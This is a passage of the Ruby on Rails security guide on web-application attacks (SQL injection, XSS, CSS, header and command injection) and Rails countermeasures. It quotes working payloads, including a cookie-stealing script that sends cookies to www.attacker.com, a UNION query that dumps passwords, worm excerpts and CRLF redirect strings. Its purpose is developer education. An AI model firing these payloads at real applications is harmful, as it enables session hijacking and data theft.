..........

And thus it found the first user in the database, returned it and logged him in. You can find out more about it in http://www.rorsecurity.info/2007/10/28/restful_authentication-login-security/[my blog post]. [,#fffcdb]#It is advisable to update your plug-ins from time to time#. Moreover, you can review your application to find more flaws like this.

=== Brute-forcing accounts

-- _Brute-force attacks on accounts are trial and error attacks on the login credentials. Fend them off with more generic error messages and possibly require to enter a CAPTCHA._

A list of user names for your web application may be misused to brute-force the corresponding passwords, because most people don't use sophisticated passwords. Most passwords are a combination of dictionary words and possibly numbers. So armed with a list of user name's and a dictionary, an automatic program may find the correct password in a matter of minutes.

Because of this, most web applications will display a generic error message “user name or password not correct”, if one of these are not correct. If it said “the user name you entered has not been found”, an attacker could automatically compile a list of user names.

However, what most web application designers neglect, are the forgot-password pages. These pages often admit that the entered user name or e-mail address has (not) been found. This allows an attacker to compile a list of user names and brute-force the accounts.

In order to mitigate such attacks, [,#fffcdb]#display a generic error message on forgot-password pages, too#. Moreover, you can [,#fffcdb]#require to enter a CAPTCHA after a number of failed logins from a certain IP address#. Note, however, that this is not a bullet-proof solution against automatic programs, because these programs may change their IP address exactly as often. However, it raises the barrier of an attack.

=== Account hijacking

-- _Many web applications make it easy to hijack user accounts. Why not be different and make it more difficult?_

==== Passwords

Think of a situation where an attacker has stolen a user's session cookie and thus may co-use the application. If it is easy to change the password, the attacker will hijack the account with a few clicks. Or if the change-password form is vulnerable to CSRF, the attacker will be able to change the victim's password by luring him to a web page where there is a crafted IMG-tag which does the CSRF. As a countermeasure, [,#fffcdb]#make change-password forms safe against CSRF#, of course. And [,#fffcdb]#require the user to enter the old password when changing it#.

==== E-Mail

However, the attacker may also take over the account by changing the e-mail address. After he changed it, he will go to the forgotten-password page and the (possibly new) password will be mailed to the attacker's e-mail address. As a countermeasure [,#fffcdb]#require the user to enter the password when changing the e-mail address, too#.

==== Other

Depending on your web application, there may be more ways to hijack the user's account. In many cases CSRF and XSS will help to do so. For example, as in a CSRF vulnerability in http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/[Google Mail]. In this proof-of-concept attack, the victim would have been lured to a web site controlled by the attacker. On that site is a crafted IMG-tag which results in a HTTP GET request that changes the filter settings of Google Mail. If the victim was logged in to Google Mail, the attacker would change the filters to forward all e-mails to his e-mail address. This is nearly as harmful as hijacking the entire account. As a countermeasure, [,#fffcdb]#review your application logic and eliminate all XSS and CSRF vulnerabilities#.

=== CAPTCHAs

-- _A CAPTCHA is a challenge-response test to determine that the response is not generated by a computer. It is often used to protect comment forms from automatic spam bots by asking the user to type the letters of a distorted image. The idea of a negative CAPTCHA is not to ask a user to proof that he is human, but reveal that a robot is a robot._

But not only spam robots (bots) are a problem, but also automatic login bots. A popular CAPTCHA API is http://recaptcha.net/[reCAPTCHA] which displays two distorted images of words from old books. It also adds an angled line, rather than a distorted background and high levels of warping on the text as earlier CAPTCHAs did, because the latter were broken. As a bonus, using reCAPTCHA helps to digitize old books. http://ambethia.com/recaptcha/[ReCAPTCHA] is also a Rails plug-in with the same name as the API.

You will get two keys from the API, a public and a private key, which you have to put into your Rails environment. After that you can use the recaptcha_tags method in the view, and the verify_recaptcha method in the controller. Verify_recaptcha will return false if the validation fails.
The problem with CAPTCHAs is, they are annoying. Additionally, some visually impaired users have found certain kinds of distorted CAPTCHAs difficult to read. The idea of negative CAPTCHAs is not to ask a user to proof that he is human, but reveal that a spam robot is a bot.

Most bots are really dumb, they crawl the web and put their spam into every form's field they can find. Negative CAPTCHAs take advantage of that and include a "honeypot" field in the form which will be hidden from the human user by CSS or JavaScript.

Here are some ideas how to hide honeypot fields by JavaScript and/or CSS:

- position the fields off of the visible area of the page
- make the elements very small or colour them the same as the background of the page
- leave the fields displayed, but tell humans to leave them blank

The most simple negative CAPTCHA is one hidden honeypot field. On the server side, you will check the value of the field: If it contains any text, it must be a bot. Then, you can either ignore the post or return a positive result, but not saving the post to the database. This way the bot will be satisfied and moves on. You can do this with annoying users, too.

You can find more sophisticated negative CAPTCHAs in Ned Batchelder's http://nedbatchelder.com/text/stopbots.html[blog post]:

- Include a field with the current UTC time-stamp in it and check it on the server. If it is too far in the past, or if it is in the future, the form is invalid.
- Randomize the field names
- Include more than one honeypot field of all types, including submission buttons

Note that this protects you only from automatic bots, targeted tailor-made bots cannot be stopped by this. So negative CAPTCHAs might not be good to protect login forms.

=== Logging

-- _Tell Rails not to put passwords in the log files._

By default, Rails logs all requests being made to the web application. But log files can be a huge security issue, as they may contain login credentials, credit card numbers etcetera. When designing a web application security concept, you should also think about what will happen if an attacker got (full) access to the web server. Encrypting secrets and passwords in the database will be quite useless, if the log files list them in clear text. You can [,#fffcdb]#filter certain request parameters from your log files# by the filter_parameter_logging method in a controller. These parameters will be marked [FILTERED] in the log.

[source, ruby]
----------------------------------------------------------------------------
filter_parameter_logging :password
----------------------------------------------------------------------------

=== Good passwords

-- _Do you find it hard to remember all your passwords? Don't write them down, but use the initial letters of each word in an easy to remember sentence._

Bruce Schneier, a security technologist, http://www.schneier.com/blog/archives/2006/12/realworld_passw.html[has analysed] 34,000 real-world user names and passwords from the MySpace phishing attack mentioned earlier. It turns out that most of the passwords are quite easy to crack. The 20 most common passwords are:

password1, abc123, myspace1, password, blink182, qwerty1, ****you, 123abc, baseball1, football1, 123456, soccer, monkey1, liverpool1, princess1, jordan23, slipknot1, superman1, iloveyou1 and monkey.

It is interesting that only 4% of these passwords were dictionary words and the great majority is actually alphanumeric. However, password cracker dictionaries contain a large number of today's passwords, and they try out all kinds of (alphanumerical) combinations. If an attacker knows your user name and you use a weak password, your account will be easily cracked.

A good password is a long alphanumeric combination of mixed cases. As this is quite hard to remember, it is advisable to enter only the [,#fffcdb]#first letters of a sentence that you can easily remember#. For example "The quick brown fox jumps over the lazy dog" will be "Tqbfjotld". Note that this is just an example, you should not use well known phrases like these, as they might appear in cracker dictionaries, too.

=== Regular expressions

-- _A common pitfall in Ruby's regular expressions is to match the string's beginning and end by ^ and $, instead of \A and \z._

Ruby uses a slightly different approach than many other languages to match the end and the beginning of a string. That is why even many Ruby and Rails books make this wrong. So how is this a security threat? Imagine you have a File model and you validate the file name by a regular expression like this:

[source, ruby]
----------------------------------------------------------------------------
class File < ActiveRecord::Base
  validates_format_of :name, :with => /^[\w\.\-\+]+$/
end
----------------------------------------------------------------------------

This means, upon saving, the model will validate the file name to consist only of alphanumeric characters, dots, + and -. And the programmer added \^ and $ so that file name will contain these characters from the beginning to the end of the string. However, [,#fffcdb]#in Ruby ^ and $ matches the *line* beginning and line end#. And thus a file name like this passes the filter without problems:

..........
file.txt%0A<script>alert('hello')</script>
..........

Whereas %0A is a line feed in URL encoding, so Rails automatically converts it to "file.txt\n<script>alert('hello')</script>". This file name passes the filter because the regular expression matches – up to the line end, the rest does not matter. The correct expression should read:

[source, ruby]
----------------------------------------------------------------------------
/\A[\w\.\-\+]+\z/
[source, ruby]
----------------------------------------------------------------------------

=== Privilege escalation

-- _Changing a single parameter may give the user unauthorized access. Remember that every parameter may be changed, no matter how much you hide or obfuscate it._

The most common parameter that a user might tamper with, is the id parameter, as in +http://www.domain.com/project/1+, whereas 1 is the id. It will be available in params[:id] in the controller. There, you will most likely do something like this:

[source, ruby]
----------------------------------------------------------------------------
@project = Project.find(params[:id])
----------------------------------------------------------------------------

This is alright for some web applications, but certainly not if the user is not authorized to view all projects. If the user changes the id to 42, and he is not allowed to see that information, he will have access to it anyway. Instead, [,#fffcdb]#query the user's access rights, too#:

[source, ruby]
----------------------------------------------------------------------------
@project = @current_user.projects.find(params[:id])
----------------------------------------------------------------------------

Depending on your web application, there will be many more parameters the user can tamper with. As a rule of thumb, [,#fffcdb]#no user input data is secure, until proven otherwise, and every parameter from the user is potentially manipulated#.

Don‘t be fooled by security by obfuscation and JavaScript security. The Web Developer Toolbar for Mozilla Firefox lets you review and change every form's hidden fields. [,#fffcdb]#JavaScript can be used to validate user input data, but certainly not to prevent attackers from sending malicious requests with unexpected values#. The Live Http Headers plugin for Mozilla Firefox logs every request and may repeat and change them. That is an easy way to bypass any JavaScript validations. And there are even client-side proxies that allow you to intercept any request and response from and to the Internet.

== Injection

-- _Injection is a class of attacks that introduce malicious code or parameters into a web application in order to run it within its security context. Prominent examples of injection are cross-site scripting (XSS) and SQL injection._

Injection is very tricky, because the same code or parameter can be malicious in one context, but totally harmless in another. A context can be a scripting, query or programming language, the shell or a Ruby/Rails method. The following sections will cover all important contexts where injection attacks may happen. The first section, however, covers an architectural decision in connection with Injection.

=== Whitelists versus Blacklists

-- _When sanitizing, protecting or verifying something, whitelists over blacklists._

A blacklist can be a list of bad e-mail addresses, non-public actions or bad HTML tags. This is opposed to a whitelist which lists the good e-mail addresses, public actions, good HTML tags and so on. Although, sometimes it is not possible to create a whitelist (in a SPAM filter, for example), [,#fffcdb]#prefer to use whitelist approaches#:

- Use before_filter :only => [...] instead of :except => [...]. This way you don't forget to turn it off for newly added actions.
- Use attr_accessible instead of attr_protected. See the mass-assignment section for details
- Allow <strong> instead of removing <script> against Cross-Site Scripting (XSS). See below for details.
- Don't try to correct user input by blacklists:
 * This will make the attack work: "<sc<script>ript>".gsub("<script>", "")
 * But reject malformed input

Whitelists are also a good approach against the human factor of forgetting something in the blacklist.

=== SQL Injection

-- _Thanks to clever methods, this is hardly a problem in most Rails applications. However, this is a very devastating and common attack in web applications, so it is important to understand the problem._

==== Introduction

SQL injection attacks aim at influencing database queries by manipulating web application parameters. A popular goal of SQL injection attacks is to bypass authorization. Another goal is to carry out data manipulation or reading arbitrary data. Here is an example of how not to use user input data in a query:

[source, ruby]
----------------------------------------------------------------------------
Project.find(:all, :conditions => "name = '#{params[:name]}'")
----------------------------------------------------------------------------

This could be in a search action and the user may enter a project's name that he wants to find. If a malicious user enters ' OR 1=1', the resulting SQL query will be:

..........
SELECT * FROM projects WHERE name = '' OR 1 --'
..........

The two dashes start a comment ignoring everything after it. So the query returns all records from the projects table including those blind to the user. This is because the condition is true for all records.

==== Bypassing authorization

Usually a web application includes access control. The user enters his login credentials, the web applications tries to find the matching record in the users table. The application grants access when it finds a record. However, an attacker may possibly bypass this check with SQL injection. The following shows a typical database query in Rails to find the first record in the users table which matches the login credentials parameters supplied by the user.

[source, ruby]
----------------------------------------------------------------------------
User.find(:first, "login = '#{params[:name]}' AND password = '#{params[:password]}'")
----------------------------------------------------------------------------

If an attacker enters ' OR '1'='1 as the name, and ' OR '2'>'1 as the password, the resulting SQL query will be:

.........
SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIMIT 1
.........

This will simply find the first record in the database, and grants access to this user.

==== Unauthorized reading

The UNION statement connects two SQL queries and returns the data in one set. An attacker can use it to read arbitrary data from the database. Let's take the example from above:

[source, ruby]
----------------------------------------------------------------------------
Project.find(:all, :conditions => "name = '#{params[:name]}'")
----------------------------------------------------------------------------

And now let's inject another query using the UNION statement:

............
') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
............

This will result in the following SQL query:

............
SELECT * FROM projects WHERE (name = '') UNION 
  SELECT id,login AS name,password AS description,1,1,1 FROM users --')
............

The result won't be a list of projects (because there is no project with an empty name), but a list of user names and their password. So hopefully you encrypted the passwords in the database! The only problem for the attacker is, that the number of columns has to be the same in both queries. That's why the second query includes a list of ones (1), which will be always the value 1, in order to match the number of columns in the first query.

Also, the second query renames some columns with the AS statement so that the web application displays the values from the user table. Be sure to update your Rails http://www.rorsecurity.info/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter/[to at least 2.1.1].

==== Countermeasures

Ruby on Rails has a built in filter for special SQL characters, which will escape ' , " , NULL character and line breaks. [,#fffcdb]#Using Model.find(id) or Model.find_by_some thing(something) automatically applies this countermeasure[,#fffcdb]#. But in SQL fragments, especially [,#fffcdb]#in conditions fragments (:conditions => "..."), the connection.execute() or Model.find_by_sql() methods, it has to be applied manually#.

Instead of passing a string to the conditions option, you can pass an array to sanitize tainted strings like this:

[source, ruby]
----------------------------------------------------------------------------
Model.find(:first, :conditions => ["login = ? AND password = ?", entered_user_name, entered_password])
----------------------------------------------------------------------------

As you can see, the first part of the array is an SQL fragment with question marks. The sanitized versions of the variables in the second part of the array replace the question marks. Or you can pass a hash for the same result:

[source, ruby]
----------------------------------------------------------------------------
Model.find(:first, :conditions => {:login => entered_user_name, :password => entered_password})
----------------------------------------------------------------------------

The array or hash form is only available in model instances. You can try +sanitize_sql()+ elsewhere. [,#fffcdb]#Make it a habit to think about the security consequences when using an external string in SQL#.

=== Cross-Site Scripting (XSS)

-- _The most widespread, and one of the most devastating security vulnerabilities in web applications is XSS. This malicious attack injects client-side executable code. Rails provides helper methods to fend these attacks off._

==== Entry points

An entry point is a vulnerable URL and its parameters where an attacker can start an attack.

The most common entry points are message posts, user comments, and guest books, but project titles, document names and search result pages have also been vulnerable - just about everywhere where the user can input data. But the input does not necessarily have to come from input boxes on web sites, it can be in any URL parameter – obvious, hidden or internal. Remember that the user may intercept any traffic. Applications, such as the http://livehttpheaders.mozdev.org/[Live HTTP Headers Firefox plugin], or client-site proxies make it easy to change requests.

XSS attacks work like this: An attacker injects some code, the web application saves it and displays it on a page, later presented to a victim. Most XSS examples simply display an alert box, but it is more powerful than that. XSS can steal the cookie, hijack the session; redirect the victim to a fake website, display advertisements for the benefit of the attacker, change elements on the web site to get confidential information or install malicious software through security holes in the web browser.

During the second half of 2007, there were 88 vulnerabilities reported in Mozilla browsers, 22 in Safari, 18 in IE, and 12 in Opera. The http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf[Symantec Global Internet Security threat report] also documented 239 browser plug-in vulnerabilities in the last six months of 2007. http://pandalabs.pandasecurity.com/archive/MPack-uncovered_2100_.aspx[Mpack] is a very active and up-to-date attack framework which exploits these vulnerabilities. For criminal hackers, it is very attractive to exploit an SQL-Injection vulnerability in a web application framework and insert malicious code in every textual table column. In April 2008 more than 510,000 sites http://www.0x000000.com/?i=556[were hacked] like this, among them the British government, United Nations and many more high targets.

A relatively new, and unusual, form of entry points are banner advertisements. In earlier 2008, malicious code appeared in banner ads on popular sites, such as MySpace and Excite, according to http://blog.trendmicro.com/myspace-excite-and-blick-serve-up-malicious-banner-ads/[Trend Micro].

==== HTML/JavaScript Injection

The most common XSS language is of course the most popular client-side scripting language JavaScript, often in combination with HTML. [,#fffcdb]#Escaping user input is essential#.

Here is the most straightforward test to check for XSS:

..........
<script>alert('Hello');</script>
..........

This JavaScript code will simply display an alert box. The next examples do exactly the same, only in very uncommon places:

..........
<img src=javascript:alert('Hello')>
<table background="javascript:alert('Hello')">
..........

===== Cookie theft

These examples don't do any harm so far, so let's see how an attacker can steal the user's cookie (and thus hijack the user's session). In JavaScript you can use the document.cookie property to read and write the document's cookie. JavaScript enforces the same origin policy, that means a script from one domain cannot access cookies of another domain. The document.cookie property holds the cookie of the originating web server. However, you can read and write this property, if you embed the code directly in the HTML document (as it happens with XSS). Inject this anywhere in your web application to see your own cookie on the result page:

..........
<script>document.write(document.cookie);</script>
..........

For an attacker, of course, this is not useful, as the victim will see his own cookie. The next example will try to load an image from the URL http://www.attacker.com/ plus the cookie. Of course this URL does not exist, so the browser displays nothing. But the attacker can review his web server's access log files to see the victims cookie.

..........
<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
..........

The log files on www.attacker.com will read like this:

..........
GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
..........

You can mitigate these attacks (in the obvious way) by adding the http://dev.rubyonrails.org/ticket/8895[httpOnly] flag to cookies, so that document.cookie may not be read by JavaScript. Http only cookies can be used from IE v6.SP1, Firefox v2.0.0.5 and Opera 9.5. Safari is still considering, it ignores the option. But other, older browsers (such as WebTV and IE 5.5 on Mac) can actually cause the page to fail to load. Be warned that cookies http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/[will still be visible using Ajax], though.

===== Defacement

With web page defacement an attacker can do a lot of things, for example, present false information or lure the victim on the attackers web site to steal the cookie, login credentials or other sensitive data. The most popular way is to include code from external sources by iframes:

..........
<iframe name=”StatPage” src="http://58.xx.xxx.xxx" width=5 height=5 style=”display:none”></iframe>
..........

This loads arbitrary HTML and/or JavaScript from an external source and embeds it as part of the site. This iFrame is taken from an http://www.symantec.com/enterprise/security_response/weblog/2007/06/italy_under_attack_mpack_gang.html[actual attack] on legitimate Italian sites using the http://isc.sans.org/diary.html?storyid=3015[Mpack attack framework]. Mpack tries to install malicious software through security holes in the web browser – very successfully, 50% of the attacks succeed.

A more specialized attack could overlap the entire web site or display a login form, which looks the same as the site's original, but transmits the user name and password to the attackers site. Or it could use CSS and/or JavaScript to hide a legitimate link in the web application, and display another one at its place which redirects to a fake web site.

Reflected injection attacks are those where the payload is not stored to present it to the victim later on, but included in the URL. Especially search forms fail to escape the search string. The following link presented a page which stated that "George Bush appointed a 9 year old boy to be the chairperson...":

..........
http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
  <script src=http://www.securitylab.ru/test/sc.js></script><!--
..........

===== Countermeasures

[,#fffcdb]#It is very important to filter malicious input, but it is also important to escape the output of the web application#.

Especially for XSS, it is important to do [,#fffcdb]#whitelist input filtering instead of blacklist#. Whitelist filtering states the values allowed as opposed to the values not allowed. Blacklists are never complete.

Imagine a blacklist deletes “script” from the user input. Now the attacker injects “<scrscriptipt>”, and after the filter, “<script>” remains. Earlier versions of Rails used a blacklist approach for the strip_tags(), strip_links() and sanitize() method. So this kind of injection was possible:

...........
strip_tags("some<<b>script>alert('hello')<</b>/script>") 
...........

This returned "some<script>alert('hello')</script>", which makes an attack work. That's why I vote for a whitelist approach, using the updated Rails 2 method sanitize():

...........
tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
s = sanitize(user_input, :tags => tags, :attributes => %w(href title))
...........

This allows only the given tags and does a good job, even against all kinds of tricks and malformed tags.

As a second step, [,#fffcdb]#it is good practice to escape all output of the application#, especially when re-displaying user input, which hasn't been input filtered (as in the search form example earlier on). [,#fffcdb]#Use escapeHTML() (or its alias h()) method# to replace the HTML input characters &,",<,> by its uninterpreted representations in HTML (&amp;, &quot;, &lt; and &gt;). However, it can easily happen that the programmer forgets to use it, so [,#fffcdb]#it is recommended to use the http://safe-erb.rubyforge.org/svn/plugins/safe_erb/[SafeErb] plugin#. SafeErb reminds you to escape strings from external sources.

===== Obfuscation and Encoding Injection

Network traffic is mostly based on the limited Western alphabet, so new character encodings, such as Unicode, emerged, to transmit characters in other languages. But, this is also a threat to web applications, as malicious code can be hidden in different encodings that the web browser might be able to process, but the web application might not. Here is an attack vector in UTF-8 encoding:

............
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
  &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
............

This example pops up a message box. It will be recognized by the above sanitize() filter, though. A great tool to obfuscate and encode strings, and thus “get to know your enemy”, is the http://www.businessinfo.co.uk/labs/hackvertor/hackvertor.php[Hackvertor]. Rails‘ sanitize() method does a good job to fend off encoding attacks.

==== Examples from the underground

-- _In order to understand today's attacks on web applications, it's best to take a look at some real-world attack vectors._

The following is an excerpt from the http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&tabid=1[Js.Yamanner@m] Yahoo! Mail http://groovin.net/stuff/yammer.txt[worm]. It appeared on June 11, 2006 and was the first webmail interface worm:

...........
<img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif' 
  target=""onload="var http_request = false;    var Email = '';
  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
...........

The worms exploits a hole in Yahoo's HTML/JavaScript filter, it usually filters all target and onload attributes from tags (because there can be JavaScript). The filter is applied only once, however, so the onload attribute with the worm code stays in place. This is a good example why blacklist filters are never complete and why it is hard to allow HTML/JavaScript in a web application.

Another proof-of-concept webmail worm is Nduja, a cross-domain worm for four Italian webmail services. Find more details and a video demonstration on http://rosario.valotta.googlepages.com/home[Rosario Valotta's website]. Both webmail worms have the goal to harvest email addresses, something a criminal hacker could make money with.

In December 2006, 34,000 actual user names and passwords were stolen in a http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html[MySpace phishing attack]. The idea of the attack was to create a profile page named “login_home_index_html”, so the URL looked very convincing. Specially-crafted HTML and CSS was used to hide the genuine MySpace content from the page and instead display its own login form.

The MySpace Samy worm will be discussed in the CSS Injection section.

=== CSS Injection

-- _CSS Injection is actually JavaScript injection, because some browsers (IE, some versions of Safari and others) allow JavaScript in CSS. Think twice about allowing custom CSS in your web application._

CSS Injection is explained best by a well-known worm, the http://namb.la/popular/tech.html[MySpace Samy worm]. This worm automatically sent a friend request to Samy (the attacker) simply by visiting his profile. Within several hours he had over 1 million friend requests, but it creates too much traffic on MySpace, so that the site goes offline. The following is a technical explanation of the worm.

MySpace blocks many tags, however it allows CSS. So the worm's author put JavaScript into CSS like this:

...........
<div style="background:url('javascript:alert(1)')">
...........

So the payload is in the style attribute. But there are no quotes allowed in the payload, because single and double quotes have already been used. But JavaScript allows has a handy eval() function which executes any string as code.

...........
<div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')"> 
...........

The eval() function is a nightmare for blacklist input filters, as it allows the style attribute to hide the word “innerHTML”:

...........
alert(eval('document.body.inne' + 'rHTML')); 
...........

The next problem was MySpace filtering the word “javascript”, so the author used “java<NEWLINE>script" to get around this:

...........
<div id="mycode" expr="alert('hah!')" style="background:url('java↵ script:eval(document.all.mycode.expr)')">
...........

Another problem for the worm's author were CSRF security tokens. Without them he couldn't send a friend request over POST. He got around it by sending a GET to the page right before adding a the user and parsing the result for the CSRF token.

In the end, he got a 4 KB worm, which he injected into his profile page.

The http://www.securiteam.com/securitynews/5LP051FHPE.html[moz-binding] CSS property proved to be another way to introduce JavaScript in CSS in Gecko-based browsers (Firefox, for example).

==== Countermeasures
This example, again, showed that a blacklist filter is never complete. However, as custom CSS in web applications is a quite rare feature, I am not aware of a whitelist CSS filter. [,#fffcdb]#If you want to allow custom colours or images, you can allow the user to choose them and build the CSS in the web application#. Use Rails' +sanitize()+ method as a model for a whitelist CSS filter, if you really need one.

=== Textile Injection

-- _If you want to provide text formatting other than HTML (due to security), use a mark-up language which is converted to HTML on the server-side. http://whytheluckystiff.net/ruby/redcloth/[RedCloth] is such a language for Ruby, but without precautions, it is also vulnerable to XSS._

	For example, RedCloth translates _test_ to <em>test<em>, which makes the text italic. However, up to the current version 3.0.4, it is still vulnerable to XSS. Get the http://www.redcloth.org[all-new version 4] that removed serious bugs. However, even that version has http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html[some security bugs], so the countermeasures still apply. Here is an example for version 3.0.4:


...........
>> RedCloth.new('<script>alert(1)</script>').to_html
=> "<script>alert(1)</script>"
...........

Use the :filter_html option to remove HTML which was not created by the Textile processor.

...........
>> RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
=> "alert(1)"
...........

However, this does not filter all HTML, a few tags will be left (by design), for example <a>:

...........
>> RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
=> "<p><a href="javascript:alert(1)">hello</a></p>"
...........

==== Countermeasures

It is recommended to [,#fffcdb]#use RedCloth in combination with a whitelist input filter#, as described in the countermeasures against XSS.

=== Ajax Injection

-- _The same security precautions have to be taken for Ajax actions as for “normal” ones. There is at least one exception, however: The output has to be escaped in the controller already, if the action doesn't render a view._

If you use the http://dev.rubyonrails.org/browser/plugins/in_place_editing[in_place_editor plugin], or actions that return a string, rather than rendering a view, [,#fffcdb]#you have to escape the return value in the action#. Otherwise, if the return value contains a XSS string, the malicious code will be executed upon return to the browser. Escape any input value using the h() method.

=== RJS Injection

-- _Don't forget to escape in JavaScript (RJS) templates, too._

The RJS API generates blocks of JavaScript code based on Ruby code, thus allowing you to manipulate a view or parts of a view from the server side. [,#fffcdb]#If you allow user input in RJS templates, do escape it using escape_javascript() within JavaScript functions, and in HTML parts using h()#. Otherwise an attacker could execute arbitrary JavaScript.

=== Command Line Injection

-- _Use user-supplied command line parameters with caution._

If your application has to execute commands in the underlying operating system, there are several methods in Ruby: exec(command), syscall(command), system(command) and \`command`. You will have to be especially careful with these functions if the user may enter the whole command, or a part of it. This is because in most shells, you can execute another command at the end of the first one, concatenating them with a semicolon (;) or a vertical bar (|).

A countermeasure is to [,#fffcdb]#use the +system(command, parameters)+ method which passes command line parameters safely#.

..........
system("/bin/echo","hello; rm *")
# prints "hello; rm *" and does not delete files
..........


=== Header Injection
-- _HTTP headers are dynamically generated and under certain circumstances user input may be injected. This can lead to false redirection, XSS or HTTP response splitting._

HTTP request headers have a Referer, User-Agent (client software) and Cookie field, among others. Response headers for example have a status code, Cookie and Location (redirection target URL) field. All of them are user-supplied and may be manipulated with more or less effort. [,#fffcdb]#Remember to escape these header fields, too.# For example when you display the user agent in an administration area.

Besides that, it is [,#fffcdb]#important to know what you are doing when building response headers partly based on user input.# For example you want to redirect the user back to a specific page. To do that you introduced a “referer“ field in a form to redirect to the given address:

..........
redirect_to params[:referer]
..........

What happens is that Rails puts the string into the Location header field and sends a 302 (redirect) status to the browser. The first thing a malicious user would do, is this:

..........
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
..........

And due to a bug in (Ruby and) Rails up to version 2.1.2 (excluding it), a hacker may inject arbitrary header fields; for example like this:

..........
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld
..........

Note that "%0d%0a" is URL-encoded for "\r\n" which is a carriage-return and line-feed (CRLF) in Ruby. So the resulting HTTP header for the second example will be the following because the second Location header field overwrites the first.

..........
HTTP/1.1 302 Moved Temporarily
(...)
Location: http://www.malicious.tld
..........

So [,#fffcdb]#attack vectors for Header Injection are based on the injection of CRLF characters in a header field.# And what could an attacker do with a false redirection? He could redirect to a phishing site that looks the same as yours, but asks to login again (and sends the login credentials to the attacker). Or he could install malicious software through browser security holes on that site. [,#fffcdb]#Rails 2.1.2 escapes these characters for the Location field in the redirect_to method. Make sure you do it yourself when you build other header fields with user input.#

==== Response Splitting
If Header Injection was possible, Response Splitting might be, too. In HTTP, the header block is followed by two CRLFs and the actual data (usually HTML). The idea of Response Splitting is to inject two CRLFs into a header field, followed by another response with malicious HTML. The response will be:

..........
HTTP/1.1 302 Found [First standard 302 response]
Date: Tue, 12 Apr 2005 22:09:07 GMT
Location: Content-Type: text/html


HTTP/1.1 200 OK [Second New response created by attacker begins]
Content-Type: text/html


<html><font color=red>hey</font></html> [Arbitary malicious input is
Keep-Alive: timeout=15, max=100         shown as the redirected page]
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html
..........

Under certain circumstances this would present the malicious HTML to the victim. However, this seems to work with Keep-Alive connections, only (and many browsers are using one-time connections). But you can't rely on this. [,#fffcdb]#In any case this is a serious bug, and you should update your Rails to version 2.0.5 or 2.1.2 to eliminate Header Injection (and thus response splitting) risks.#


== Additional resources

The security landscape shifts and it is important to keep up to date, because missing a new vulnerability can be catastrophic. You can find additional resources about (Rails) security here:

- The Ruby on Rails security project posts security news regularly: http://www.rorsecurity.info[http://www.rorsecurity.info]
- Subscribe to the Rails security http://groups.google.com/group/rubyonrails-security[mailing list]
- http://secunia.com/[Keep up to date on the other application layers] (they have a weekly newsletter, too)
- A http://ha.ckers.org/blog/[good security blog] including the http://ha.ckers.org/xss.html[Cross-Site scripting Cheat Sheet]
- Another http://www.0x000000.com/[good security blog] with some Cheat Sheets, too

== Changelog ==

http://rails.lighthouseapp.com/projects/16213-rails-guides/tickets/7[Lighthouse ticket]

* November 1, 2008: First approved version by Heiko Webers
